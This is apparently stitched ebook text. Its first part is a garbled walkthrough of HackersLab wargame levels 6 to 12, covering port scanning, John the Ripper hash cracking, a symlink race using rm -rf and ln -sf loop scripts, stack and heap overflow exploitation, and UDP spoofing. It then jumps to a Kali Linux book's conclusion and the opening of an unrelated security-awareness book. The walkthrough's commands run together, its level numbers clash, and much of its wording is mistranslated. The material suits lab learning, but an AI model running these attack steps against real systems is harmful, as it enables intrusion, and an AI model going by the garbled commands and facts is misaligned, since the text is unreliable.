Best of The Best Hackerslab was the correct password. Direct to the top level. If you want, instead of going straight to logging in as level6 and entering the password, use the right password on the backdoor to make John angry again!

Level 6 Problem

Login: level6 Password: Best of The Best Hackerslab Study: Port Scan.

This is one of the easiest levels of HackersLab. It's for a really relaxed time. It focuses on the following fact: there is a second open door for access to the system. What are these doors? Whenever you connect to a system, a "Socket" is created. A socket is nothing more than the IP + address combination service door. This allows the same internet address to have multiple services running as Web Server, FTP, SMTP, POP, and others.Some common port numbers:21 - FTP22 - SSH23 - TELNET25 - SMTP79 - FINGER80 - WWW3128 - PROXY6000 – XWINDOWSSERVER, common ports using TCP and UDP protocols.

For example: when I connect to any web page like http://www.visualbooks.com.br, I'm actually connecting to HTTP: //www.visualbooks.com.br:80 (visualbooks.com.br, on port 80, which is the web standard). So far it seems easy. But we fall into the following problem - there are 65535 ports for both TCP and UDP protocols. There are doors that never end anymore. How can we find out which ones are open and which aren't? By using door scanners. Port scanners are applications that try to find out in a certain IP address or host, which ports are open. They can usually use a list of most known ports, or a range (example: from 1000 to 8000). They are usually extremely fast and results quickly return to us. Common port scanners perform a TCP connect () on the most targeted machine. This means that it performs the three TCP authentication paths ( syn- syn / ack-ack ). Using this system, it is easy for the scanner to discover the scanning attempt. A firewall or IDS, for example, quickly captures the hacker's IP. To end this, there are now more sophisticated scanners, like NMAP.NMAP, which can scan in many ways besides TCP connect (), has half syn () scanning (only sent syn ), fin, Xmas and others. Each type uses different flags to make it difficult to detect the scanned host. At this step-by-step level, I will use two different scanners: NMAP, for Linux, and VALHALLA for Windows and we'll try to find the port.

We connected as level6 and did the basics again. But we don't have any files now ... why? Of course ... I must find a door system access, but do not attempt to break the security of any files. Let's use NMAP first to try to detect the port. After sending NMAP to scan drill.hackerslab.org, it returned me three23, 80 and 6969\. Now 23 is from telnet, 80 from the webserver and this 6969? Hmmm, very suspicious. Let's move VALHALLA to Windows, then. VALHALLA is a program created by me, which besides a scanner of hosts and IPs, is a monitor of ports and portscan detector. It can be picked up at [http://www.anti-trojans.cjb.net](http://www.anti-trojans.cjb.net). Almost the same result. Found port 23 at 80, 100 and 6969\. The most suspicious for sure is 6969\. Let's telnet to it and see what happens.

Just enter telnet drill.hackerslab.org 6969, placing the port in front of the name. The result came up? A login prompt similar to the usual HackersLab login appeared. Asked for my level6 password ... after typing, bingo! The system returned to me: assets!! Level7's password is Can't help falling in love. I already said this level would be easy ... no?

Level 7 Problem

Login: level7 Password: Can't help falling in love Study: Breaking Unix / Linux Passwords.

Many older hackers are already used to the words DES, shadow, Cracker Jack, John the Ripper ... shame the new generation doesn't have such intimacy with these terms. Unix / Linux uses a password encryption system called DES. This system creates an encrypted string and places it in the security file.system names which are usually / etc / passwd. Used to use now / etc /shadow. They moved to the shadow archive hoping to increase the security, leaving the original password with only the usernames. Those who take control of the system can get any file, even the shadow. A typical shadow entry: mflavio: yFdrXa1EwNYng: 12126: 0: 99999: 7 ::: According to the previous information, we have the username asmflavio. Encrypted Password: yFdrXa1EwNYng. The rest of the numbers are System IDs (UID, GID, etc.).

Great, I have a user's password on Linux, but it's encrypted! No problem, I'll get a program that decrypts. That sounds feasible, but that's impossible. As I said before, DES creates a hash, which is a one-way encryption system. It cannot be decrypted. But then ... how do we find out the password? Just use your imagination. Think: if the password in shadow cannot be decrypted, how does the system compare this password with the password that the user types when logging in? Easy. The system encrypts the new password and compares the two encrypted values. If they are equal, that is the password CrackerJack and John The Ripper are programs that allow you to use a wordlist or brute force to “crack” Unix /Linux. They will encrypt each word using DES and compare it with the password that is in the password file. If the result hits ... that's the right password. Of course, for this, you need to have a good wordlist. A wordlist contains passwords commonly used and divided into categories like movie names, German words, etc ...Let's see again, in practice, how this process is done.

We log into HackersLab and look for the file with UID level8 and GIDlevel7\. We found / dev / audio2 . We enter the / dev directory and run ./audio. The program shows some trash on the screen. But is it really rubbish? It shows three strings (which could probably also be obtained using this string) command: level8, shadow, and VoE4HoQCFfMW2. Well, I deduced a little bit, by the hash face of the last string and the other two, I think we found the password ... encrypted.

We will have to try to find out the password using John the Ripper (which can be obtained at http://www.blackcode.com). But first, we need to stop the wordlist and adapt the encrypted password. Is there a way you can try to figure out the password just by typing the hash as John the Ripper's command line? For this, you could use a single option. But for study questions, we took a shadow file and replaced the root password with our obtained hash. Thus, we simulated and cracked a shadow file. The JTR (John The Ripper) will try all the words in this list as passwords. The list has been saved as passwords.txt. Now, let's use JTR. JTR was executed as john –wordfile: passwords.txt shadow (sig-Nice: Dear John, please use the wordlist passwords.txt to remove passwords which will be tested in shadow). It quickly returned the password to me.

It is wonderfu. What a strange word is that? Pen-a little while later we find out: wonderfu actually is wonderful only from English), one of the words on our list. But why did he only show eight characters (the last one is the missing “l”)? This is the same problem that occurs when the Program File directory becomes a file. The program is DOS-based, and it can show only eight characters. Of course, you can change that in the rules. To learn more, take a look at the JTR manual. What matters is that the password for level8 is wonderful!

Level 8 Problem

Login: level8 Password: wonderful Study: Race Conditions.

At this point, a lot of changes in the HackersLab challenge. Levels below these were pretty simple so there wasn't much to talk about studying, this change now from race conditions. They are conceived a little more complicated than we dealt with till now and these require a greater knowledge (including code examples) to be properly understood. If you don't know C, it would be better if you had a notion before, but for now, it doesn't matter. Understanding the general concept behind the problem is already a step forward.

This much theoretical introduction of the race condition problem is necessary to understand how it occurs, how problems occur between two reads and write functions and get a sense of which functions can be used to correct a certain problem. If you have no notion of C and were "floating" in the explanation, I suggest you try to learn a little, because all levels after this will use programming. This level was much higher than the previous ones and it will be easy to understand step by step.

We connect to HackersLab as level8, we find the file for level9 UID and level8 GID. We found what was mentioned in the problem, /usr / bin /ps2\. After entering the / usr / bin directory , I tried to run ./ps2 . Nothing happens ... but really? We know that it creates a temporary file, but suppose that we were not told about it. So we can “check” our actions using the strace command. Typing strace / usr / bin / ps2 (without the quotation marks). Let's take a look at what the command generated: Sounds like a joke ... there is everything we saw in the study ... the open () function opening a temporary file without any descriptor checks, attempting to write the string hahahahahahaha using the write () function without reading any of the permissions, and worse, giving us the filename instead of creating a random file.

Let's try to create some "little scripts" to link the temporary file /var/tmp2/ps2.tmp created by the ps2 program to some content of our interest. You will have to use the VI text editor to create two small little programs or scripts. One will be running the ps2 file so we can enjoy our race condition before it "closes" the /var/tmp2/ps2.tmp file. Just type vi <file name> . In the first script, for example, create a file named race1 (or other filename) inside the var / directorytmp2 (or other temporary directory) using the vi / var / tmp2 / race1 command. The same goes for the second script. When starting the VI, type “ a ” to enter edit mode and press Esc to return to program mode. race1 while trueof/ usr / bin / ps2donerace2while trueof/ usr / bin / ps2 &rm -rf /var/tmp2/ps2.tmpln -sf / var / tmp2 / race1 /var/tmp2/ps2.tmpdone. A little tip about VI: When you're done typing, press the Esc key; to save (after pressing Esc), type: w (colon+ w); and to exit: q (colon + q), as in the following example: Let's take a look. Both scripts will loop. The first (race1) normally runs the ps2 file but keeps repeating, giving us a long time to change the temporary file. Already the second script (race2), runs the ps2 program again, but as background (using do &), thus giving us even more time to win the race. In the loop, race2 tries to remove the temporary file and replace it with a link to the race1 file.

Let’s go line by line to not complicate: / usr / bin / ps2 & (run the program again);rm -rf /var/tmp2/ps2.tmp (delete temporary file);ln -sf / var / tmp2 / race1 /var/tmp2/ps2.tmp (overrides the temp- a link to the first script, so the program will try to record the string in our script instead of the temporary file). Having created both scripts, we will have to give them execute permission. IS just type the commands: chmod + x race1 and chmod + x race2, as shown in the permissions before chmod and after? Now we can execute. Now we have to do something unheard of in HackersLab: We connect it twice. That is, you will have to open two telnet windows and log in as level8 twice at the same time. In one of the windows, you will rotate race1 by typing ./race1, and in the other, race2 by typing ./race2\. You will get some “junk” on the screen when you run both, something like “existing file”. But after running race2, if race1 is already running, your "trash" will become this:

"Congratulations!!! Your race attack was a success ... the level9 password is! Secu! ”

Note: At this level, there was no need to worry about/bin/pass file, since ps2 itself contained the password.

Level 9 Problem

Login: level9 Password:! Secu! Study: Overflow Buffers

In this study, we will look at the principle of a “buffer memory flood” (or buffer overflow). Basically, there are two types of buffer overflow: stack overflow, which refers to the stack; and heap overflow, which refers to heap memory. Now, we'll see a general theoretical explanation for the bof (buffers the view flow), more specifically, the stack overflow. We will leave the heap to level 11 (where it is needed).

We are looking for a file that has level10 UID and level9 GID. We found the file / etc / bof (what a suggestive name ... bof = bufferoverflow). We list your permissions and see something interesting. Besides our permission to execute, there is a bit there. It is a level10 SUID bit. Continuing to check, we ran the program. He asks you to put a nickname (nick_name). I wrote my name and he showed us on the screen “hello~ macros_flavio ”. Just as a test, what would happen if I put a string too long? Would the program do “bound checking”? Or will I flood the buffer? Just testing to know ...I put a lot of "x" on the screen. An error occurred: Segmentation fault. Bingo!

This means we flood the buffer and the program is vulnerable. Let's go take action, then. Above, we already wrote the exploit using VI and named it exploit.c. We compiled using cc exploit.c -o exploit. He gave any warning at the time to compile, but it doesn't matter, the program is ready, and with permission of execution. To show what a shellcode environment variable looks like, I typed the set command (this is not necessary) and showed the garbage above (Note: Before typing set, I had already run the exploit). Now let's try to flood the buffer. First, I typed ./exploit 60 to try to flood the buffer at this address. (0xbffff438). I ran / etc / bof $ RET $ EGG (just to remember: we're going through all of these programs as argv, or arguments as if they were the name that targets the requested program.). In the $ RET variable is the address we are trying to discover, and in $ EGG, the shellcode. Nothing happened. We tried the same process but now with 80 instead of 60\. Nothing. We try again with 156, and ... it worked! See bash $ in the previous figure. We hit the correct address. Of course, it was luck. If you want to make this process easier, create a looping script and try multiple addresses (at level 11, I do show one). Let's run / bin / pass then. Beauty and Beast is the password ... to level 10!

Level 10 Problem

Until we finish the connection, We will have to keep spoofing and sniffing at the Target, really thinking that is talking to the victim. Of course, doing it “by hand” is horrible, so there are various applications to accomplish the process. We have dozens of them for Linux, like spoofit, lcrzoex (which is multiplatform) and others. We also have programs for Windows 2000 that spoof IP and MAC addresses. One is sterm, where it is super easy to configure IP spoofing, as shown in the following figure. Look at Appendix B where to get these programs. UDP Spoof Now that we've seen how spoofing is done on IP, it's easy to understand how we'll do a UDP spoof to get the next level HackersLab password. The principle is the same but much easier. UDP, unlike TCP, has no three-way authentication. It is considered an “unreliable” communication protocol because if a packet is lost it doesn't matter. UDP is widely used for broadcasting (when streaming some video or music on the Internet, for example). Consequently, we need not have to try to find out some type of sequence number to send a spoofed UDP packet to. Just get the header of this package (still on the root machine that allows usRAW packets) and include the new “spoofed” address. We have two options to do this: use the excellent hping tool(www.hping.org), which performs various types of spoofing, including UDP, with the exception of result lenses. Or we will write our own code in C to do so. As per a didactic question, we will have the second option.

Exchange my code email for yours, and you will receive the password. Remember in the beginning I said that few people can get through even at this level? Well, the problem is this: too many firewalls and routers block spoofed packets. That means there is a very good chance great that on the route between your computer and HackersLab, a router “Prevent” the spoiled package. How to do then? Try multiple routes ... I tried to run the program several free shells I could get on the Internet until from a shell of a friend of mine from Fortaleza worked and I received the password by email. Let's run it step by step to see then. Step by step So let's try our spoofing. In the figure below, we compile the udpspoofbr (or whatever name you want), which we saw the code in the sectionstudy, and we perform. He asked us for source IP, source port, destination IP and destination port. In the problem, it asked us to send a message as if it were from www.hackerslab.org, from any door, todrill.hackerslab.org on port 5555\. So I typed the command like this: ./udpspoofbr www.hackerslab.org 1234 drill.hackerslab.org5555 Note that the source port makes no difference, so much so that we put1234\. But I got a "socket failed" error. Of course, I have to be root to do it, or the system won't allow you to manipulate RAW packets to spoof. Let's try again as root.

Now yes ... with my proper root privileges, I sent the spoofed package. That's why if you don't have Linux at home, you need it. In HackersLab, you don't have root access and you can't send the spoiled UPD package. After a few minutes, I received something interesting in the message content sent to me by email:What?? Does that mean I couldn’t?? Permission Denied)? No ... this (curiously) is the password for the next level. Forward to level 11!

Level 11 Problem

Just as stack overflow is a danger, so is heap overflow. Whenever we use the dangerous combination of non-limiting functions’ buffer size with programs that have SUID bit and file rights .root, we created a big problem. Understanding this concept well, the walkthrough will be quite simple. Find the problem files, choose the exploit and change the values PROGVULN and ARQVULN. Step by step We connected to HackersLab and found the file / usr / local /bin/hof, quoted in the problem description. Let's take a look and see if it really causes a segmentation error. Let's execute it.

And there it is. He asked us for the level 11 password, and shortly thereafter a failed segmentation fault has occurred. It's our gateway, as in the stack. Only now there's a different thing. The program acts as follows: If we provide the correct password, it will access the passwd.success file (or access if the error did not occur), and if we make a mistake, it accesses passwd.fail. We will try to exploit passwd.success, using the segmentation error to access the contents of this file with the hof program's SUID permissions. I do our exploit in VI and set the PROGVULN constants to /usr / local / bin / hof and ARQVULN as /usr/local/bin / passwd.success. SavedWe compiled it (cc exploit.c -o exploit) and that's it! Let's test and perform a little brute force with hexadecimal addresses until we can. 

Ready! After a few attempts with different addresses, (note something: to find the right address, we were trying to address until PATH / usr / local /bin/hof appears full on the screen.). And voila! I want to love forever is the password for level 13.

Level 12 Problem

Login: level128 Password: I want to love forever Study: Simple Encryption

We have already discussed encryption, and from that level, HackersLab started repeat techniques already seen (read on other levels). At level 7, I had said we must use the John the Ripper program to try to find out the password encrypted.

We had an advantage that we don't have at this level. The algorithm of encryption was known, and we even had a program ready to do the job. Now we have only the encryption tool mentioned in the problem: /usr / bin / encrypt. Objective: Using this program, try to code several things to find out what kind of “encryption” is used. We know that the encrypted password is tu | tSI / Z ^. Let's explore one little bit of the program we use to try to figure out how it works. We can use scripts or code to try to do the work for us, but to avoid unnecessary “finger wasting” by typing a program into HackersLab VI, Let's use the head.First: the password tu | tSI / Z ^ is nine characters long. If encryption is simple, this is probably the number of characters of the original password to be encrypted. This is the first test we will do with encrypting: $ ./encrypt aaaaaaaaa encrypted character: 'GGGBBB-SS' We use encrypted to encrypt the string aaaaaaaaa, from nine characters. From here, let's change (kicking) some values to try to get close to our encrypted value. $ ./encrypt aaa1aaaaa  encrypted character: 't GGBBB-SS'$ ./encrypt aaaa2aaaa encrypted character: 'G u GBBB-SS'$ ./encrypt aaaaa9aaa encrypted character: 'GG | BBB-SS '$ ./encrypt aaa129aaa encrypted character: 'you | BBB-SS '$ ./encrypt caa129aaa encrypted character: 'you | BBB / SS'$ ./encrypt cha129aaa encrypted character: 'you | BBB / Z S'$ ./encrypt chl129aaa encrypted character: 'you | BBB / Z ^'$ ./encrypt chl1296aa encrypted character: 'you | t BB / Z ^ '$ ./encrypt chl1296rh encrypted character: ' tu | tSI / Z ^ ' Going on the basis of trial and error, we managed to come up with a value that corresponds to the encrypted password. I did a lot more than shown above, but it would be a little pointless to spend a few pages with malicious attempts.

Of course, the chances are slim when encryption involves Lots of numbers. In this case, you can make a script that automates the process. Is it with this value that we come to the password to the next level? Let's test it step by step. Step by step We connected to HackersLab and found the encrypted program. Let's guess it now with the string chl1296rh which we got in the study where We tested encrypt thoroughly.We then run ./encrypt chl1296rh | more (to go to screen byscreen).Encryption will be applied a few dozen times and we will reach the encrypted result:

It's really the password we try to match the encrypted password that we were given. But does it work? Just testing to know ...That!!! The password works yes. This means that the password for level13 ischl1296rh.

Other Levels ... More of the same

We will end the in-depth study of the book at level 12\. Why is this so if HackersLab has (at least so far) I'm writing) 17 levels? The problem is that from level 13 there are no more "news" that might be worth a study. I don't think you want to just pass the levels and yes learn. Well, let's say the levels of 13a 17 are a set of what you have learned so far with a hint of C. The study, from now on, would be nothing more than “a book of C”, with gigantic codes and many comments, and besides, I'm sure you want a little break to get your head past those levels now that you already have a good sense of how the challenge works.

To help a little, I will list the remaining levels of and write what kind of subject each one is about. So, you will know that "Way" to follow. Level 13, this level handles socket programming. Following the specifications of the level problem (seen at www.hackerslab.org), use a header protocol.h (http://www.hackerslab.org/eorg/fhz/proto.h) and build agram, according to your instructions, to calculate distances and send the value three times back to the server to get the password. Level 14, this level will require you to know C, what execve is, and how to set breakpoints using GDB. It's very annoying. But it's worth it!

Overflow using function pointers. Not much different than what we did before. Reread the heap overflow chapter, there is everything you need to solve this. Level 16 more stack overflow ... a bit more complicated maybe, but it's still the good old stack overflow!!! Level 17 I won't spoil your surprise ... come and find out!!!! :-)

> Conclusion

Thank you for making it through to the end of Kali Linux for Hackers, let’s hope it was informative and able to provide you with all of the tools you need to achieve your goals, whatever they may be.

Administrators should keep up with the times and deal with the hacker's weapons. Of course, Kali-Linux does not include all the tools that cybercriminals try. But with the included tools, relatively obvious weaknesses can be traced. This book has attempted to lead the readers through the partly complex use of Kali-Linux.

The nice thing about this book is that it not only presents the tools in Kali-Linux and their use in detail, but also addresses the exploited gaps themselves. This allows less experienced users to understand where possible dangers threaten.

> Hacker Basic Security

Learning Effective Methods of Security and How to Manage Cyber Risks

Awareness Program with Attack and Defense Strategy Tools

Art of Exploitation in Hacking

> Introduction

Firstly, I want to commend you for taking the bold step to download this book, “Hacker Basic Security: Learning Effective methods of security and how to manage the cyber risks. Awareness program with attack and defense strategy tools. Art of exploitation in hacking.” This book contains everything thing you need, including established steps with strategies for the best ways of dealing with security issues with your computer. You will learn how to protect yourself against malicious hackers who will do anything to jeopardize your security infrastructure. 

This book will guide you on how to prepare yourself against anyone who wants to intrude into your personal data or invade your privacy. Today, millions of internet users are constantly attacked with billions of dollars lost daily because they lack basic security expertise. Stopping these hackers is very hard because you are dealing with people who will do whatever possible to get what they want. However, it does not mean you cannot protect yourself. You can stop these activities perpetrated by these hackers; you can learn how to hack, not for fraudulent activities, but to protect yourself against any malicious hackers.

Whether you like it or not, cybersecurity doesn’t affect only your neighbor. It affects everyone in the world. It doesn’t matter the nature of your business, location, or security features that you pride to have. You are not safe even if you live in the United States, even if it is supposedly the most security inclined nation. Undeniably, the safety of any motorists affects other drivers on the road. It is like containing an individual in a particular environment because such a person got the flu. By doing so, you prevent the spread in other areas of the community. Maintaining a proper cybersecurity measure also affects the world.

Most times, when we talk about cybersecurity, we focus on devices because they tend to be the most affected and easy means through which hackers gain access to our information. One infected device has a way of compromising other systems, which further makes the owners’ information and data vulnerable to hackers. There is no better time to talk about cybersecurity than now when the lives of every youth are about 80% online. How can we teach these youth the importance of cybersecurity? Although, these individuals may not use their credit cards or banking card to shop online, however, they are making it much easier for hackers or cybercriminals to access their personal data and accounts. Besides these, bad practices in social media, emails, and weak passwords are just means through which these hackers find it easier to hack into people’s computers.

The current problem of cybersecurity

You rose up from your bed, and the first thing that comes to your mind is your phone. You look at the recent events, appointments, and log off. Then you have a shower, dress up and off you go for the day’s work. You got to the office and took your first coffee before realizing that you are on autopilot mode.

Without considering anything, it is logical for us to close our doors before leaving. At least for our safety, we put on seat belt not because we are comfortable with them. The same thing applies to a helmet when you are riding a bike. You don’t just cross the street without looking for on incoming vehicle. The truth is we integrate various safety actions to survive the dangers of real-life situations. However, one question many haven’t answered is if they are prepared to survive in the cyber world?

As you are reading this book, you may be among the 1 billion people connected to the internet. You are one of those internet users that contribute to generating information on the internet whenever you:

*   > Click a link

*   > Perform a Google search on anything

*   > Send or receive an instant message

*   > Download or install an application

*   > Publish content on a blog, social network, or web

*   > Like content on social media

*   > Buy something through an online store

The list is endless because the internet has enabled us to do way beyond our imagination. The amount of information we produce is far more than what anyone can imagine and we most times underestimate this information. We underestimate their value and quantity and downplay on a whole lot of things. We have become less concerned about the kind of information we generate while we perform various activities online. It doesn’t matter if you believe it or not, we have people who want that information at your own disadvantage.

Our information becomes like gold once we are connected to the internet. We begin to live like those in a glasshouse. The bad thing about living in a glasshouse is that those passing through your vicinity will see what you are doing. In the same vein, when we leave our devices unsecured, we let the hackers take advantage of our information.

I know the word “hacker” means different things for different people. Today, its meaning may vary depending on the particular context upon which the word is used. For instance, if you check the dictionary, you will find its meaning relating to an individual who likes to explore the complexities of programmable systems and find ways of squeezing their capabilities. This is different from those whose endeavor is to learn the skill. This doesn’t speak of anyone whose primary motive is to commit fraudulent activities on the network. Notwithstanding, if you check through various publications on the internet and the media, you do find out that the term “hacker” usually refers to someone who deals in cybercrime. At times, they are referred to as crackers, black hat, or attackers. The primary motives of these attackers are to make money from innocent users online. In situations where such a motive isn’t monetary, it can be as a way of boasting in their capabilities or merely ideological.

What should matter to you, as a user is that these attackers create complex attack methods daily to steal sensitive information? Regrettably, they are successful in doing things because users haven’t put into place necessary security practices to mitigate their strategies. It may interest you to know that criminal activities generate much money in the world than anything. A recent report indicated that cyber-attack is higher in cost than a natural disaster.

> Chapter 1: Fundamentals and Importance of Cybersecurity

Fundamentals of Cybersecurity

The innovation in the information technology industry is driving efficacy and ease of use; this represents a big deal of great value. If you have observed the nature of technology, you will know by now that these attributes (efficacy and ease of usage of technology) will overtime increase. While various organizations are embracing different cybersecurity methods to protect their data and information, it is imperative for individuals to take their online security very crucial. In view of this, I have assembled the four fundamentals for personal cybersecurity that every individual requires. The truth remains that the government alone cannot pull the string as we all have a vital role to play. The following four fundamentals to your personal cybersecurity aren’t relevant to individuals alone as companies and employees in various workplaces can adhere to them.

Protection of Devices

All our gadgets and devices such as tablets, pads, laptops, smartphones, etc. are always connected to the internet. In order to avoid any leak of information or any intrusion, individuals must protect these devices using the best security protection features available. Luckily, a recent innovation in technology has brought about effective and high-quality protection systems, which previously were only available to large firms. The following precautions must be followed as it regards your device protection.

*   > Your device should have real-time antivirus with other defense systems set up

*   > There must be a remote management feature, which removes any requirement for users input or any behavioral modifications

*   > Password management applications must work effortlessly throughout various mobile device platforms

*   > Protection of Internet Connection

> It is not enough protecting your device because immediately your device connects online, it can become a victim. Due to this, your device will require more defenses to protect every information within it, which is transmitted through the internet.

> Your device should have its own virtual private network (VPN) to encrypt your location. I will talk about VPN extensively in latter chapters because of its importance to your cybersecurity. However, a good VPN will do you much good, as it will protect your location, identity, banking, shopping, and browsing history. It also protects your information transacted online, whether it is business or personal.

*   > Protect Email Communication

> The third fundamentals to your personal cybersecurity are the protection of your email communication. Statistics have shown that most hackers gain the back door to your personal information through email communication. Regrettably, in the United States, for instance, many consumers expect emails to be free, and this has preoccupied us from the primary sense of privacy.

> In using email communication, it is important to use an email service provider that uses open-source software for portability, security, and compatibility throughout various technology platforms and architecture. Furthermore, the service must automatically strip metadata information and IP location from personal emails as they are sent through the internet.

*   > Protection and Backing up of Files and Electronic Documents

> We have various remote backup services that provide backup services at an affordable rate. Furthermore, the convenience of saving your documents on the cloud sounds amazing in this generation. However, not all document can go through this process. You can also use a digital vault to save critical and sensitive documents. Sensitive documents include birth certificates, scanned passports, tax returns, trusts, wills, social security cards, etc.

> The promotion of these four fundamentals of personal cybersecurity processes in your personal life or company can help drive cybersecurity awareness to a higher level. Interestingly, these solutions are not expensive but important if you don’t want anyone to invade your privacy.

Importance of Cyber Security

We live in a world where our daily lives are constantly conducted online. It is astounding to neglect the issues faced online regarding your computer and network security. However, most people become aware of these issues when there is a national challenge, such as a photo leak of a celebrity or security breach of a top politician. Notwithstanding, we are faced with common cybercrime, which tends to be more prevalent than those of the national issues are. You will agree with me that daily we are bombarded with by cybercriminals or hackers who do everything possible to victimize their victims.

Regrettably, most victims give these cybercriminals an easy chase. Only a few of these hackers or criminals are masterminds or experts at what they do. Furthermore, the lack of awareness and ignorance concerning cybersecurity has made it easier for these criminals to have an easy ride and target their victims. With these, they can steal their identity and hack into their information without any fight from their victim.

For instance, about 3,000 companies in the United States reported various issues regarding security breaches in their company. Unfortunately, these companies don’t include those running small online businesses but huge retailers, including Home Depot and Target. Credit card information and customers’ data were stolen with money collected from various accounts, and other intellectual property leaked. In most situations, these hackers will hack into the internal systems of the company and hold those documents for ransom. According to statistics, cybercrime costs the world economy about $400 billion per year. Because of this, organizations and companies throughout the world are constantly making cybersecurity a top priority by adhering to various standards.

Important Factors of Cybersecurity

Cybersecurity has become a constant challenge and priority within the last ten years. The threat imposed by these hackers seems to outsmart the defense mechanism established to counter these threats. Furthermore, there are indications that the threats will continue unless something is done swiftly. It is not a surprising factor to see that people are becoming security conscious. This has led to cybersecurity experts investing time to confront this menace.

There are various factors, which have clearly shown the importance of cybersecurity in this era. Fighting against fraudulent activities is a big issue and doing that in real-time is a better approach to dealing with the situation rather than resolving it later. I like to indicate some important cybersecurity factors that require the utmost attention along with potential solutions.

*   > Information Wars

> Considering the significance of data globally, information wars are now becoming popular. With the current trend, there are projections that this war will be more dominant in the coming years. Besides data theft that is destructive to an economy, personal data are also targeted, thereby leaving people more vulnerable.

*   > New Vulnerabilities

> Recent advanced technologies aren’t left out as they are experiencing exponential growth, which is a breeding ground for new vulnerabilities. Studies have estimated familiar risk will contribute to 80% of cybersecurity happenings.

*   > Cloud Storage Security

> Because of minimal storage systems, most organizations are depending on the cloud for the storage of their data. This could serve as a major threat to their privacy. The issue of instability and insecurity access poses a huge threat to anyone's confidential information. To deal with this issue, the creation of a cloud decision model can help in controlling those involved in using these data.

*   > Internet of Things (IoT)

> Most businesses today are depending heavily on internet technologies for transfer and access of data. Nevertheless, these businesses aren’t aware of the hidden challenges arising from the use of these new technologies. Furthermore, a serious threat to IoTs is the vulnerability to their personal data. Additionally, using default password mechanisms and faulty communication methods poses huge threats. Another threat could be a breach of privacy.

*   > Blockchain and Ransomware Security

> Virus, malware, ransomware, and Trojans are a common cybersecurity threat where the files of an infected system are encrypted. These attackers encrypt these files with the intention of taking ransom from their victims before the decryption key can be given to them. Unfortunately, these victims may be obliged to paying and yet not certain that their attackers will release the key. The likelihood of blockchain security can be a significant phenomenon. The blockchain security would be a central figure in years to come.

*   > Authentication Tools

> Previous authentication tools used in cybersecurity were designed for general purpose. However, with an increased level of threats, there is a need to implement new risk-based authentication tools. With these tools, the fight can be taken to a certain extent to prevent any possible data breaches.

*   > Training Non-Technical Staffs

> Organizations must take into consideration the training of its non-technical staff because the responsibility of cybersecurity is in the care of everyone. Furthermore, giving seminars or training regarding the benefits and importance of cybersecurity will serve as a good measure to minimize cybercrime threats.

*   > Artificial Intelligence

> The use of artificial intelligence can make a remarkable difference in the fight against cybercriminals and hackers. To an extent, it will substitute the weakness of a lack of cybersecurity experts.

*   > Digital Ecosystems

> The role of cybersecurity plays shouldn’t be taken lightly because it impacts the world. As you read further in this book, you will understand how cybersecurity and its threat pose a huge influence in the world. With respect to this, every individual must play its role in the security, privacy, and protection of data.

*   > Integration of Security Technology

> This factor will be the game changer we need to stay ahead of security threats. With the current trends, integration hubs are increasing and companies are depending on security technology to manage their situation in a better manner. To have a comprehensive cybersecurity plan together, this must include content protection, passwords, IP, privacy, data security, and relevant encryption technology. If you want to stay ahead of any threat and control the situation, you must be abreast with current security technology

On a final note, proper measures are required to deal with this rising security threat to one privacy and data. Serious interventions from various governments are necessary to provide care, attention, and scrutiny. These factors mentioned here are important as it relates to cybersecurity. Remember, cybercriminals and attackers aren’t targeting companies alone; the fight is now also against individuals who are unaware of their privacy. Therefore, all hands must be on deck as we take the fight to these cybercriminals by first protecting ourselves with the right information.

> Chapter 2: Cybersecurity Risks and attacks

With a lot of definitions of cybersecurity, it is hard to find a definition that fits every purpose. However, cybersecurity involves the practice of guaranteeing the confidentiality, integrity, and accessibility of information. It signifies the ability to defend and recover from any power outages, system failure, and attackers from cybercriminals. Looking at cybersecurity as the practice of confidentiality, integrity, and accessibility of information includes cybercriminals, hackers to script kiddies who have the potential of carrying out advanced persistent threats. Furthermore, this poses serious threats to both individuals and businesses.

Types of Cybersecurity

If we were to discuss the scope of cybersecurity, that would be too broad. However, my goal is to describe the core areas and important cybersecurity strategy you should take into account.

The following are some of the types of cybersecurity:

*   > Critical Infrastructure

> This type of cybersecurity consists of the cyber-physical system, which our society depends on. They include traffic lights, water purification, hospitals, and the electricity grid. For instance, if you plug a power plant into the internet, it makes it susceptible to cyber-attack. Therefore, it is the duty of those responsible for critical infrastructure to be diligence in protection against any form of vulnerability.

*   > Network Security

> Most times, when you hear of cybersecurity, network security is what many consider first. Network security is very important because it helps us guard against any form of illegal intrusion including malicious insiders. There are usually trade-offs if we want to ensure network security. For instance, installing access controls may be necessary; however, it does slow down the work productivity. The various tools used in monitoring network security generates numerous data. In order to manage this process effectively, security professions are using a machine to avert real-time threats.

*   > Cloud Security

> With companies now moving their information to the cloud, this has created a new security challenge that requires an immediate solution. For instance, recently there have been data breaches because of a poorly configured cloud system. To avert this, cloud storage providers are designing new security tools to help secure the data of their clients.

*   > Application Security

> One of the weakest points of attack in cybersecurity is web applications. Regrettably, only a few organizations have the resources to mitigate such risks or vulnerabilities. The deployment and rapid application development to the cloud have led to the innovation of DevOps.

*   > Internet of Things Security

> This refers to both critical and non-critical cyber-physical systems including printers, sensors, security cameras, and appliances. IoT devices offer little security patches, which poses a threat to users and those using the internet.

Types of Cybersecurity Threats/Attack

Studying histories of famous battles, you will notice that each battle is different. The tactics and strategies of fighting these battles may be similar because they are effective over time. In the same manner, when a cybercriminal attacks a computer, they don’t reinvent their attack strategy unless the situation warrants such. They come up with various attacking strategies that have been effective for them over time. They may use cross-site scripting, phishing or malware to do this.

Perhaps you are trying to come to the reality of the recent data breach headlines, it does help you to recognize the various means these attackers can cause severe harm to their victims. Before looking at the different types of attacks, I want to categorize these cyber threats into three categories.

1.  > Attacks on Confidentiality

> Most cyber-attacks begin with the stealing of personal information rather than copying it. These attacks on confidentiality including stealing Bitcoin wallets, identity theft, and credit card fraud, etc. Some hackers or cybercriminals make confidential attacks their priority as they aim to gather confidential information for their economic, military, and political gain.

2.  > Attacks on Availability

> Today, we see this kind of attack in the form of denial-of-service and ransomware where victims are denied access to their data when they need it. A denial-of-service flood the resource of a network to make it unavailable whereas ransomware encrypts the information of a victim and request for a ransom before it can be decrypted.

3.  > Attacks on Integrity

> Also known as a sabotage attack, the purpose of this attack is to damage, corrupt, and destroy the systems or information. This attack would cause a little typographical error.

Methods of Cyber-Attacks

Cybercriminals employ various means to perform their malicious activities.

Among these includes:

*   > Social Engineering or Malware

